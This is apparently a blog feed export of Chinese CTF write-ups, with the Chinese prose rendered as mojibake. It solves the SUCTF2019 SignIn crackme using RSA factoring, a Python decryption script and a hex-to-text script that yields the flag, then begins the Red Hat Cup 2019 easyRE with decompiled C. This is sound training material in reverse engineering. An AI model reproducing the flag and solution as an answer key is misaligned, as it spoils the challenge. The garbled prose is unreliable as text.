å¯†ï¼Œè§£å¯†çš„å¯†é’¥æˆ‘è‡ªå·±ç•™ç€ï¼Œç”±äºEveä¸æ¸…æ¥šè§£å¯†æ–¹å¼è‡ªç„¶å°±æ— æ³•è·å–ä¿¡æ¯äº†ã€‚</p><h1 id="RSAåŠ å¯†"><a href="#RSAåŠ å¯†" class="headerlink" title="RSAåŠ å¯†"></a>RSAåŠ å¯†</h1><p>é¦–å…ˆé€‰å–ä¸¤ä¸ªå¾ˆå¤§çš„è´¨æ•°<code>p</code>,<code>q</code>ã€‚</p><p>ä»¤<code>n=p*q</code>ï¼Œä»»æ„é€‰å–ä¸€ä¸ªå¾ˆå¤§çš„è´¨æ•°åšå…¬é’¥æŒ‡æ•°ï¼Œé‚£ä¹ˆ<code>(n,e)</code>å°±å½¢æˆäº†å…¬é’¥ï¼Œå¯ä»¥ç”¨å®ƒè¿›è¡ŒåŠ å¯†ï¼Œå‡å¦‚æ˜æ–‡ä¸ºmï¼Œé‚£ä¹ˆå¯†æ–‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plain</span><br><span class="line"></span><br><span class="line">c=m^e mod n</span><br></pre></td></tr></table></figure><p>æˆ‘è‡ªå·±ç”Ÿæˆçš„p,qåšè¿ç®—<code>Ï†(n)=(p-1)(q-1)</code></p><p><code>d=inverse(e,Ï†(n))</code>ï¼Œ<code>inverse</code>å‡½æ•°ä¸ºæ±‚æ¨¡é€†å…ƒå‡½æ•°</p><p><code>(n,d)</code>å°±æ˜¯ç§é’¥ï¼Œæ˜¯åªæœ‰æˆ‘ä»¬è‡ªå·±çŸ¥é“çš„ã€‚</p><p>æˆ‘æ‹¿åˆ°å¯†æ–‡cåæˆ‘å¯ä»¥ç”¨dè¿˜åŸæ˜æ–‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plain</span><br><span class="line"></span><br><span class="line">m=c^d mod n</span><br></pre></td></tr></table></figure><h1 id="RSAåŠ å¯†çš„ç ´è§£"><a href="#RSAåŠ å¯†çš„ç ´è§£" class="headerlink" title="RSAåŠ å¯†çš„ç ´è§£"></a>RSAåŠ å¯†çš„ç ´è§£</h1><p>ç ´è§£çš„å…³é”®åœ¨äºåˆ†è§£nçš„è´¨å› æ•°ï¼Œå¦‚æœåˆ†è§£å¾—åˆ°çš„p,qé‚£ä¹ˆæˆ‘ä»¬å°±å¾ˆå®¹æ˜“æ¨å¾—ç§é’¥dã€‚</p><p>åœ¨åº”ç”¨å½“ä¸­ï¼Œnä¸€èˆ¬æœ‰2048ä½ï¼ŒåŸºæœ¬æ˜¯ç ´è§£ä¸å‡ºçš„ï¼Œè€Œåœ¨æ¯”èµ›çš„æ—¶å€™nå°±åªæœ‰ä¸åˆ°ç™¾ä½ï¼Œç”¨ä¸€äº›åœ¨çº¿å·¥å…·ä¹Ÿæ˜¯å¾ˆå¿«å¯ä»¥ç ´è§£å¾—åˆ°på’Œqçš„ã€‚</p><p>ä½†æ˜¯æ‹¿åˆ°äº†ä¸€ä¸ªå¾ˆå¤§ä½æ•°çš„ç§é’¥dé‚£ä¹Ÿä¸é¡¶ç”¨å•Šï¼Œç®—è¿˜æ˜¯ç®—ä¸äº†å•Šï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥ç”¨ç¬¬ä¸‰æ–¹è§£å¯†åŒ…RSAï¼Œä¹Ÿå¯ä»¥æ‰‹å†™ç®—æ³•è§£å†³ï¼Œä½œä¸ºä¸€ä¸ªACMerï¼Œå°±å¾—æŠŠçè—å·²ä¹…çš„å¿«é€Ÿå¹‚ç®—æ³•æ‹¿å‡ºæ¥äº†ï¼Œç”±äºpythonæ”¯æŒå¤§æ•°ï¼Œæ‰€ä»¥æˆ‘ä¼šç”¨pythonå†™ã€‚</p><h1 id="ä¾‹é¢˜-SUCTF2019-SignIn"><a href="#ä¾‹é¢˜-SUCTF2019-SignIn" class="headerlink" title="ä¾‹é¢˜:[SUCTF2019]SignIn"></a>ä¾‹é¢˜:[<a href="https://buuoj.cn/challenges#[SUCTF2019]SignIn">SUCTF2019]SignIn</a></h1><p>æ‹¿åˆ°elfæ–‡ä»¶å…ˆæ‹–è¿›IDAæ‰“å¼€å­—ç¬¦ä¸²çª—å£<code>(shift+F12)</code>ï¼Œå‘ç°å¾ˆå®¹æ˜“çœ‹åˆ°å­—ç¬¦ä¸²<code>[input flag]</code>ï¼Œé‚£ä¹ˆè·Ÿè¿›å»æ‰¾åˆ°å‡½æ•°<code>main()</code></p><p><img src="https://i.loli.net/2021/05/07/q6bVAWsiu2m3SgT.png" alt="buuctf SignIn_1.png"></p><p>å‘ç°å¤šäº†å¾ˆå¤šä¸è®¤è¯†çš„å‡½æ•°ï¼Œä½†æ˜¯æ ¹æ®å®ƒçš„å‚æ•°ä¹Ÿå¯ä»¥å¾ˆå®¹æ˜“å‘ç°è¿™æ˜¯ä¸ªå­—ç¬¦ä¸²èµ‹å€¼çš„å‡½æ•°ï¼Œè€Œä¸”åé¢åŠ äº†å‚æ•°<code>10</code>æˆ–è€…<code>16</code>å¾ˆåƒå®ƒçš„è¿›åˆ¶ã€‚åé¢çš„<code>GG</code>å’Œ<code>TTTTTTql!</code>è‚¯å®šå°±æ˜¯åˆ¤æ–­ä½ è¾“å…¥çš„flagçš„æ­£è¯¯äº†ã€‚</p><p>ä»å¤´å¼€å§‹åˆ†æï¼Œè¾“å…¥çš„æ˜¯v8å­—ç¬¦ä¸²ï¼Œv8ç»è¿‡äº†sub_96Aå‡½æ•°çš„æ´—ç¤¼ï¼Œè·Ÿè¿›å»çœ‹çœ‹é€»è¾‘å…³ç³»ã€‚</p><p><img src="https://i.loli.net/2021/05/07/gmD4cXz23kZLVft.png" alt="buuctf SignIn_2.png"></p><p>å¾ˆå®¹æ˜“å‘ç°å®ƒæ˜¯æŠŠa1å­—ç¬¦ä¸²æ‹†è§£æˆé«˜å­—èŠ‚å’Œä½å­—èŠ‚åˆ†åˆ«å­˜å‚¨åˆ°a2[i]å’Œa2[i+1]ï¼Œè‡³äºå­—ç¬¦ä¸²byte_202010é‚£å°±æ˜¯å¾ˆå…¸å‹çš„16è¿›åˆ¶è¡¨<code>0123456789abcdef</code>ï¼Œé‚£ä¹ˆæˆ‘è¾“å…¥çš„å®ƒç»™å®ƒæ‹†æˆ16è¿›åˆ¶æ•°äº†ï¼Œé‚£ä¹ˆç­‰ä¼šé€†å‘è§£å›å»çš„è¯è¿™ä¸ªè¿˜æ˜¯å¾ˆå¥½é€†å›å»çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬<code>ESC</code>è·³å›åŸæ¥çš„å‡½æ•°ã€‚</p><p>v8çš„å€¼è½¬æ¢ç»™äº†v9ï¼Œv7ä¸ºä¸‹é¢æ¯”è¾ƒå­—ç¬¦ä¸²çš„å…¶ä¸­ä¸€ä¸ªï¼Œç„¶åæŠŠv9è½¬æ¢æˆ16è¿›åˆ¶æ•°èµ‹ç»™v6ï¼Œv5=65537ã€‚å…¶å®è¿™ä¸ªç‰¹å¾éƒ½å°±å·²ç»å‘Šè¯‰ä½ è¿™æ˜¯RSAè§£å¯†ã€‚æ¯•ç«ŸåŠ å¯†æŒ‡æ•°65537æ˜¯ååˆ†å¸¸è§çš„RSAåŠ å¯†æŒ‡æ•°ã€‚é‚£ä¹ˆä¸‹é¢è¿˜æœ‰ä¸€ä¸ªä¸è®¤è¯†çš„å‡½æ•°ï¼Œä¸è¿‡çœ‹å®ƒçš„åç¼€powmï¼Œpowä½ å°±å¾ˆå®¹æ˜“çœ‹å‡ºæ¥æ˜¯å–æ¬¡æ–¹ï¼Œç„¶åmä¸å°±æ˜¯æ¨¡modäº†ä¹ˆ(æ‰‹åŠ¨æ»‘ç¨½)ã€‚æ‰€ä»¥è¿™ä¸ªå‡½æ•°å®ç°çš„åŠŸèƒ½ç­‰ä»·äºä¸€ä¸ªè¡¨è¾¾å¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v6=v6^v5%v4</span><br></pre></td></tr></table></figure><p>ç›¸å½“äºv6æ˜¯æˆ‘ä»¬è¾“å…¥çš„ï¼Œç„¶åè¿™ä¸ªç»“æœæˆ‘ä»¬æ˜¯çŸ¥é“çš„ï¼Œæ¨¡æ•°nå’ŒæŒ‡æ•°eæˆ‘ä»¬ä¹ŸçŸ¥é“ï¼Œé‚£ä¹ˆå°±å¯¹å®ƒç»“æœ(v7)è¿›è¡ŒRSAè§£å¯†ã€‚</p><p>1.ç ´è§£å¾—åˆ°p,qï¼Œ<a href="http://www.factordb.com/index.php">åœ¨çº¿å·¥å…·</a></p><p>2.ç¼–å†™è„šæœ¬è§£å¯†ï¼Œè¿™é‡Œç”¨ç¬¬ä¸‰æ–¹åŒ…è§£å¯†æˆ‘å°±ä¸æ¼”ç¤ºäº†ï¼Œä¸»è¦çœ‹çœ‹è§£å¯†çš„è¿‡ç¨‹ã€‚</p><p>è„šæœ¬ä¸­çš„æ•°ä¸€å¾‹ä¸º10è¿›åˆ¶ï¼Œè½¬æ¢çš„ç®€å•æ–¹æ³•:æŠŠæ•°å¤åˆ¶åˆ°pythonäº¤äº’çª—å£åŠ ä¸Šå‰ç¼€<code>0x</code>å°±å¯ä»¥è¾“å‡ºå®ƒçš„10è¿›åˆ¶æ•°å€¼äº†ã€‚</p><p><img src="https://i.loli.net/2021/05/07/nAc9TG5p4hDgrLq.png" alt="buuctf SignIn_3.png"></p><p>å¿«é€Ÿå¹‚çš„è„šæœ¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">python</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">while(d):</span><br><span class="line">    if d&amp;1:</span><br><span class="line">        x=x*c%n</span><br><span class="line">    c=c*c%n</span><br><span class="line">    d=d//2</span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°æ•°å€¼<code>185534734614696481020381637136165435809958101675798337848243069</code>ã€‚</p><p>è¿™é‡Œè¿˜è¦è½¬å›16è¿›åˆ¶å†è¢«é€†å›å»å¤„ç†ï¼Œå› ä¸ºå®ƒä»¥å¼€å§‹ä¹Ÿå°±æ˜¯16è¿›åˆ¶çš„ï¼Œæˆ‘ä»¬è¿˜ç”¨python<code>hex(185534734614696481020381637136165435809958101675798337848243069)</code>å¾—åˆ°16è¿›åˆ¶æ•°ã€‚</p><p><img src="https://i.loli.net/2021/05/07/IzF89jYiTCL6bdp.png" alt="buuctf SignIn_4.png"></p><p>æœ€åä¸€æ­¥å°±å¯ä»¥å†™è„šæœ¬åšæœ€åä¸€æ­¥è§£å¯†äº†ï¼Œè¿™ä¸€æ­¥å¾ˆç®€å•ï¼Œå°±æ˜¯16è¿›åˆ¶è½¬å­—ç¬¦ä¸²ï¼Œè¿™ä¸ªæˆ‘å–œæ¬¢ç”¨C++å†™ï¼Œæˆ‘æ„Ÿè§‰ä¼šæ¯”è¾ƒæ–¹ä¾¿ã€‚</p><p><img src="https://i.loli.net/2021/05/07/OMTJFghtDpBrKan.png" alt="buuctf SignIn_5.png"></p><p>å¾—åˆ°flag</p><p>æœ¬ç¯‡æ‰€æœ‰çš„exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">python</span><br><span class="line"></span><br><span class="line">#RSAè§£å¯†è„šæœ¬</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">p=282164587459512124844245113950593348271</span><br><span class="line">q=366669102002966856876605669837014229419</span><br><span class="line">phi=(p-1)*(q-1)</span><br><span class="line">e=65537</span><br><span class="line">d=inverse(e,phi)</span><br><span class="line">c=78510953323073667749065685964447569045476327122134491251061064910992472210485</span><br><span class="line">n=103461035900816914121390101299049044413950405173712170434161686539878160984549</span><br><span class="line">x=1</span><br><span class="line">while(d):</span><br><span class="line">    if d&amp;1:</span><br><span class="line">        x=x*c%n</span><br><span class="line">    c=c*c%n</span><br><span class="line">    d=d//2</span><br><span class="line">print(x)</span><br><span class="line">c++</span><br><span class="line"></span><br><span class="line">//hex2rawè„šæœ¬</span><br><span class="line">#include&lt;bits/stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">//char s[100];</span><br><span class="line">char s[]=&quot;73756374667b50776e5f405f68756e647265645f79656172737d&quot;;</span><br><span class="line">int b=0;</span><br><span class="line">int main()&#123;</span><br><span class="line">    for(int i=0;i&lt;strlen(s);i+=2)&#123;</span><br><span class="line">        int x=0;</span><br><span class="line">        if(s[i]&lt;=&#x27;9&#x27;)&#123;</span><br><span class="line">            x=(s[i]-&#x27;0&#x27;)&lt;&lt;4;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            x=(s[i]-&#x27;a&#x27;+10)&lt;&lt;4;</span><br><span class="line">        &#125;</span><br><span class="line">        if(s[i+1]&lt;=&#x27;9&#x27;)&#123;</span><br><span class="line">            x+=(s[i+1]-&#x27;0&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            x+=(s[i+1]-&#x27;a&#x27;+10);</span><br><span class="line">        &#125;</span><br><span class="line">        printf(&quot;%c&quot;,x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ¬ä½œè€…ä¹Ÿæ˜¯æ²¡æƒ³åˆ°å•Šï¼Œå­¦é€†å‘è¦æŠŠåŠ å¯†çœ‹é‚£ä¹ˆé€çš„ï¼Œå½“æ—¶å­¦RSAå·æ‡’äº†å•Šï¼Œæ‰€ä»¥å¯¼è‡´æ˜¨å¤©æ¡èµ·åˆèŠ±äº†å¾ˆå¤šæ—¶é—´ï¼Œä¸è¿‡ä¹Ÿå¥½ï¼ŒåŠ æ·±äº†æˆ‘å¯¹RSAç®—æ³•çš„å°è±¡ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> crypto </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>çº¢å¸½æ¯2019 easyRe</title>
      <link href="/2021/05/06/%E7%BA%A2%E5%B8%BD%E6%9D%AF2019%20Easyre%20wp/"/>
      <url>/2021/05/06/%E7%BA%A2%E5%B8%BD%E6%9D%AF2019%20Easyre%20wp/</url>
      
        <content type="html"><![CDATA[<p><code>pwn</code>é¢˜åšå®Œ<code>re</code>é¢˜å½“ç„¶ä¹Ÿä¸èƒ½å°‘ï¼Œ<code>buu</code>ä¸Šé™¤äº†é‚£äº›æ°´é¢˜ï¼Œå¼€å§‹åšä¸€äº›å¸¦ç‚¹æŠ€æœ¯å«é‡çš„é¢˜ç›®äº†ã€‚</p><span id="more"></span><p>çº¢å¸½æ¯2019çš„<code>easyRE</code>ä¸Šæ¥å°±æ˜¯<code>800KB</code>çš„<code>elf</code>æ–‡ä»¶ï¼Œçœ‹èµ·æ¥å°±å¾ˆæœ‰æŠ€æœ¯å«é‡çš„æ ·å­ã€‚å…¶å®çœ‹åˆ°å¤§æ–‡ä»¶ä¸ç”¨æ€•ï¼Œå‡½æ•°å¤šä¹Ÿä¸ç”¨æ€•ï¼Œå› ä¸ºéœ€è¦åˆ†æçš„å‡½æ•°ä¸€å®šåªæœ‰å‡ ä¸ªï¼Œå¦‚æœä½ ç‚¹è¿›å»è°ƒç”¨äº†å¤§éƒ¨åˆ†ä½ æ²¡è§è¿‡çš„å‡½æ•°ï¼Œè¿˜æœ‰ååˆ†å¤æ‚çš„<code>goto</code>å…³ç³»ï¼Œé‚£ä¹ˆè¿™ä¸ªå‡½æ•°ä½ å¯ä»¥ç›´æ¥å½“ä»–ä¸å­˜åœ¨ï¼Œè¿™æ˜¯æˆ‘è‡ªå·±å¾—åˆ°çš„ä¸€ä¸ªç»“è®ºï¼Œä¸ä¸€å®šå¯¹ï¼Œä½†æ˜¯å¯ä»¥åº”ä»˜å¤§éƒ¨åˆ†çš„é¢˜ç›®ã€‚åºŸè¯ä¸å¤šè¯´è¿›å…¥æ­£é¢˜ï¼š<a href="https://buuoj.cn/challenges#[2019%E7%BA%A2%E5%B8%BD%E6%9D%AF]easyRE">buuctf 2019çº¢å¸½æ¯easyRE</a></p><p>æ‰€æœ‰äºŒè¿›åˆ¶å®‰å…¨ç›¸å…³çš„é¢˜ç›®å­—ç¬¦ä¸²ä¸€å®šæ˜¯åˆ‡å…¥ç‚¹ï¼Œå› ä¸ºå®ƒå¯è¯»ã€‚åš<code>pwn</code>é¢˜ä½ å°±æ‰¾<code>flag</code>ï¼Œ<code>bin/sh</code>ï¼Œå½“ç„¶è¿™æ˜¯ç­¾åˆ°-éš¾åº¦çš„é¢˜ç›®æ‰ä¼šæœ‰çš„å­—ç¬¦ä¸²ã€‚åšé€†å‘é¢˜çš„è¯ï¼Œçœ‹åˆ°å¾ˆé•¿çš„64ä½æˆ–è€…65ä½å¤§å°å†™å­—æ¯å’Œæ•°å­—å’Œä¸€äº›å…¶å®ƒå­—ç¬¦ç»„æˆçš„è¡¨ï¼Œé‚£ä¹ˆç›´æ¥è€ƒè™‘<code>base64</code>ï¼Œç„¶åå°±æ˜¯ä¸€äº›å¸¦<code>flag</code>çš„å­—ç¬¦ä¸²æˆ–è€…æ˜¯ä»€ä¹ˆ<code>right</code>ï¼Œ<code>correct</code>ï¼Œ<code>congratulate</code>ä¹‹ç±»åˆ¤æ–­æ­£è¯¯çš„è¯ï¼Œé‚£ä¹ˆå¤šåŠä¹Ÿæ˜¯ä»¥è°ƒç”¨è¿™ä¸ªå­—ç¬¦ä¸²çš„å‡½æ•°ä¸ºä¸­å¿ƒå»åˆ†æã€‚å¥½çš„ï¼Œæ‰“å¼€å…ˆçœ‹ä¸€ä¸‹ï¼Œçœ‹åˆ°æœ‰å¾ˆå¤šå¾ˆå¤šçš„å‡½æ•°ï¼Œå…ˆä¸æ…Œ(å®åˆ™æ…Œçš„ä¸€æ‰¹)ï¼Œå†·é™åœ°å…ˆæ‘ä¸€ä¸ª<code>shift+F12</code>æŸ¥çœ‹å­—ç¬¦ä¸²ã€‚</p><p><img src="https://i.loli.net/2021/05/06/5bQk79uOfiWDAea.png" alt="buuoj çº¢å¸½æ¯2019 easyRE_1.png"></p><p>ä¸€çœ¼å°±å¯ä»¥çœ‹é“æœ‰ä¸€ä¸ªç»å…¸çš„<code>base64</code>è¡¨ï¼Œè¿˜æœ‰ä¸€å¥è¯<code>you found me</code>(ä½ æ‰¾åˆ°æˆ‘äº†)ï¼Œåƒæäº†<code>flag</code>è·Ÿæˆ‘ä»¬çš„å¯¹è¯ï¼Œé‚£ä¹ˆè¯ä¸å¤šè¯´ï¼Œç‚¹è¿›å»æ‰¾åˆ°è¿™ä¸ªå‡½æ•°çœ‹çœ‹åˆ°åº•åœ¨å“ªé‡Œå‘å‡ºäº†è¿™æ ·çš„æ„Ÿå¹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_4009C6</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-114h]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-108h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+20h] [rbp-100h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+28h] [rbp-F8h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+30h] [rbp-F0h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+38h] [rbp-E8h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+40h] [rbp-E0h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+48h] [rbp-D8h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+50h] [rbp-D0h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+58h] [rbp-C8h]</span></span><br><span class="line">  <span class="keyword">char</span> v12[<span class="number">13</span>]; <span class="comment">// [rsp+60h] [rbp-C0h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v13[<span class="number">4</span>]; <span class="comment">// [rsp+6Dh] [rbp-B3h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v14[<span class="number">19</span>]; <span class="comment">// [rsp+71h] [rbp-AFh] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v15[<span class="number">32</span>]; <span class="comment">// [rsp+90h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [rsp+B0h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">char</span> v17; <span class="comment">// [rsp+B4h] [rbp-6Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v18[<span class="number">72</span>]; <span class="comment">// [rsp+C0h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v19; <span class="comment">// [rsp+108h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v19 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  qmemcpy(v12, <span class="string">&quot;Iodl&gt;Qnb(ocy&quot;</span>, <span class="number">12</span>);</span><br><span class="line">  v12[<span class="number">12</span>] = <span class="number">127</span>;</span><br><span class="line">  qmemcpy(v13, <span class="string">&quot;y.i&quot;</span>, <span class="number">3</span>);</span><br><span class="line">  v13[<span class="number">3</span>] = <span class="number">127</span>;</span><br><span class="line">  qmemcpy(v14, <span class="string">&quot;d`3w&#125;wek9&#123;iy=~yL@EC&quot;</span>, <span class="keyword">sizeof</span>(v14));</span><br><span class="line">  <span class="built_in">memset</span>(v15, <span class="number">0</span>, <span class="keyword">sizeof</span>(v15));</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  sub_4406E0(<span class="number">0LL</span>, v15, <span class="number">37LL</span>);</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( sub_424BA0(v15) == <span class="number">36</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; (<span class="keyword">unsigned</span> __int64)sub_424BA0(v15); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)(v15[i] ^ i) != v12[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        result = <span class="number">4294967294LL</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_410CC0(<span class="string">&quot;continue!&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(v18, <span class="number">0</span>, <span class="number">0x40</span>uLL);</span><br><span class="line">    v18[<span class="number">64</span>] = <span class="number">0</span>;</span><br><span class="line">    sub_4406E0(<span class="number">0LL</span>, v18, <span class="number">64LL</span>);</span><br><span class="line">    v18[<span class="number">39</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( sub_424BA0(v18) == <span class="number">39</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = sub_400E44(v18);</span><br><span class="line">      v3 = sub_400E44(v2);</span><br><span class="line">      v4 = sub_400E44(v3);</span><br><span class="line">      v5 = sub_400E44(v4);</span><br><span class="line">      v6 = sub_400E44(v5);</span><br><span class="line">      v7 = sub_400E44(v6);</span><br><span class="line">      v8 = sub_400E44(v7);</span><br><span class="line">      v9 = sub_400E44(v8);</span><br><span class="line">      v10 = sub_400E44(v9);</span><br><span class="line">      v11 = sub_400E44(v10);</span><br><span class="line">      <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_400360(v11, off_6CC090) )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_410CC0(<span class="string">&quot;You found me!!!&quot;</span>);</span><br><span class="line">        sub_410CC0(<span class="string">&quot;bye bye~&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      result = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="number">4294967293LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_13:</span><br><span class="line">  <span class="keyword">if</span> ( __readfsqword(<span class="number">0x28</span>u) != v19 )</span><br><span class="line">    sub_444020();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰¾åˆ°è¿™ä¸ªå‡½æ•°ä¹‹åå°±æ˜¯ä»¥è¿™ä¸ªä¸ºä¸»å»åˆ†æäº†ï¼Œç”±äºè¿™ä¸ªå‡½æ•°ç‰¹åˆ«ä¸å‹å¥½ï¼Œæˆ‘ä»¬å¾—å»çœ‹çœ‹è¿™ä¸ªå‡½æ•°è°ƒç”¨çš„å…¶å®ƒé‚£ä¹ˆå¤šsubå‡½æ•°æœ‰æ²¡æœ‰æˆ‘ä»¬è®¤è¯†çš„ç†Ÿæ‚‰çš„å‡½æ•°ã€‚å…¶å®ç¬¬ä¸€ç‚¹å¾ˆå®¹æ˜“å¯ä»¥çœ‹å‡º<code>sub_410CC00</code>éå¸¸åƒè¾“å‡ºä¸€å¥è¯ï¼Œä¹Ÿå°±æ˜¯<code>puts</code>å‡½æ•°ï¼Œå½“ç„¶æŠŠå®ƒç†è§£ä¸º<code>printf</code>ä¹Ÿæ²¡æœ‰å…³ç³»ï¼Œä¸å½±å“ã€‚æ ¹æ®ä»£ç æ®µ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v18[<span class="number">39</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> ( sub_424BA0(v18) == <span class="number">39</span> )</span><br></pre></td></tr></table></figure><p>å‡½æ•°å‚æ•°ä¸ºå­—ç¬¦æŒ‡é’ˆï¼Œè¿”å›ä¸€ä¸ªæ•°å€¼ï¼Œæ˜¯ä¸æ˜¯åƒæäº†strlenå‡½æ•°ï¼Ÿ</p><p><code>sub_4406E0(0LL, v15, 